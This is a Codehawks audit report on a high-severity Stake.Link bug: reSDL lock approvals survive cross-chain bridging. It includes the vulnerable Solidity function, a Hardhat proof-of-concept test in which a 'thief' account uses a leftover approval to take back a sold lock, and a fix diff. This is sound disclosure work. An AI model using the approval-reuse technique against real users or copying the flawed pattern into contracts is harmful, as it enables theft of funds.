---
tags:
  - lang/solidity
  - platform/codehawks
  - has/github
  - has/poc
  - severity/high
  - sector/bridge
  - sector/nft
protocol: "[[Stake.Link]]"
auditors:
  - "[[innertia]]"
genome:
  - "[[frozen-funds]]"
  - "[[direct-drain]]"
  - "[[account-ownership]]"
---
# A user can steal an already transfered and bridged reSDL lock because of approval

- id: 29738
- impact: HIGH
- protocol: [[Stake.Link]]
- reporter: innertia (Codehawks)
- source: N/A

## Summary


A user can currently steal an already transferred and bridged reSDL lock due to a bug in the approval process. This poses a high risk as it allows for the possibility of stealing funds. The vulnerability lies in the `handleOutgoingRESDL()` function, which does not delete the approval when a reSDL token is bridged to another chain. This means that a malicious user can set an approval to move their lock to an alternative account and then trade the ownership to a victim. If the victim bridges the lock to another chain, the malicious user can use the approval to steal the reSDL lock. A proof of concept has been provided in the report to demonstrate this vulnerability. To fix this issue, the approval should be deleted when a lock is bridged between chains.

## Details

### Relevant GitHub Links
<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L172-L199">https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolPrimary.sol#L172-L199</a>

<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L259-L281">https://github.com/Cyfrin/2023-12-stake-link/blob/main/contracts/core/sdlPool/SDLPoolSecondary.sol#L259-L281</a>


## Summary
The reSDL token approval is not deleted when the lock is bridged to an other chain

## Vulnerability Details
When a reSDL token is bridged to an other chain, the `handleOutgoingRESDL()` function is called to make the state changes into the `sdlPool` contract. The function executes the following:

```
    function handleOutgoingRESDL(
        address _sender,
        uint256 _lockId,
        address _sdlReceiver
    )
        external
        onlyCCIPController
        onlyLockOwner(_lockId, _sender)
        updateRewards(_sender)
        updateRewards(ccipController)
        returns (Lock memory)
    {
        Lock memory lock = locks[_lockId];

        delete locks[_lockId].amount;
        delete lockOwners[_lockId];
        balances[_sender] -= 1;

        uint256 totalAmount = lock.amount + lock.boostAmount;
        effectiveBalances[_sender] -= totalAmount;
        effectiveBalances[ccipController] += totalAmount;

        sdlToken.safeTransfer(_sdlReceiver, lock.amount);

        emit OutgoingRESDL(_sender, _lockId);

        return lock;
    }
```
As we can see, it deletes the lock.amount of the lockId, removes the ownership of the lock and decrements the lock balance of the account that is bridging the lock.
The approval that the user had before bridging the reSDL lock will remain there and he can get benefited from it by stealing the NFT.
Consider the following situation:
A user knows that there is a victim that is willing to pay the underlying value for a reSDL lock ownership transfer. What the malicious user can do is set approval to move his lockId in all supported chains to an alt address that he owns. Then, he trades the underlying value for the reSDL ownership and the lock is transfered to the victim/buyer. If the buyer keeps the lock in this chain nothing happens, but if he bridges any of the other supported chains, the malicious user can use the approval of his alt account to steal the reSDL lock.

#### Proof of Concept
It is written inside `resdl-token-bridge.test.ts` because it uses its setup
```
  it('PoC steal reSDL', async () => {
    let lockId = 2

    let thief = accounts[0]
    let victim = accounts[1]

    let thiefAccount2 = accounts[2]

    let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp

    // Thief approves an alt account that he controls to move his lock in the original chain
    await sdlPool.approve(thiefAccount2, lockId)

    assert.equal(await sdlPool.getApproved(2), thiefAccount2);

    // Thief bridges the lock to an other chain but the approval is not deleted
    await bridge.transferRESDL(77, victim, lockId, true, toEther(10), { value: toEther(10) })
    let lastRequestMsg = await onRamp.getLastRequestMessage()
    assert.deepEqual(
      ethers.utils.defaultAbiCoder
        .decode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],
          lastRequestMsg[1]
        )
        .map((d, i) => {
          if (i == 0) return d
          if (i > 1 && i < 4) return fromEther(d)
          return d.toNumber()
        }),
      [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]
    )
    assert.deepEqual(
      lastRequestMsg[2].map((d) => [d.token, fromEther(d.amount)]),
      `[sdlToken.address, 1000]`
    )
    assert.equal(lastRequestMsg[3], wrappedNative.address)
    assert.equal(lastRequestMsg[4], '0x11')
    await expect(sdlPool.ownerOf(lockId)).to.be.revertedWith('InvalidLockId()')

    // The user that received the lock from bridging on the other chain decides to bridge the lock id
    // back to the original chain
    await offRamp
      .connect(signers[6])
      .executeSingleMessage(
        ethers.utils.formatBytes32String('messageId'),
        77,
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],
          [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]
        ),
        sdlPoolCCIPController.address,
        [{ token: sdlToken.address, amount: toEther(25) }]
      )


    // Now the victim owns the reSDL lock on the original chain
    assert.equal(await sdlPool.ownerOf(2), victim)

    // However, this lockId has the approval that originally the thief set to his alt account and victim do not know that
    assert.equal(await sdlPool.getApproved(2), thiefAccount2);

    // Thief transfers back to his main account the reSDL via his alt account
    await sdlPool
      .connect(signers[2])
      .transferFrom(victim, thief, lockId)

    // Thief is now the owner of the reSDL
    assert.equal(await sdlPool.ownerOf(2), thief)
  })
```

## Impact
High, possibility to steal funds

## Tools Used
Manual review

## Recommendations
When bridging a lock between chains, the lock approval should be deleted.

```diff
     function handleOutgoingRESDL(
         address _sender,
         uint256 _lockId,
         address _sdlReceiver
     )
         external
         onlyCCIPController
         onlyLockOwner(_lockId, _sender)
         updateRewards(_sender)
         updateRewards(ccipController)
         returns (Lock memory)
     {
         Lock memory lock = locks[_lockId];
 
         delete locks[_lockId].amount;
         delete lockOwners[_lockId];
         balances[_sender] -= 1;
+        delete tokenApprovals[_lockId];

         uint256 totalAmount = lock.amount + lock.boostAmount;
         effectiveBalances[_sender] -= totalAmount;
         effectiveBalances[ccipController] += totalAmount;

         sdlToken.safeTransfer(_sdlReceiver, lock.amount);

         emit OutgoingRESDL(_sender, _lockId);

         return lock;
     }
```
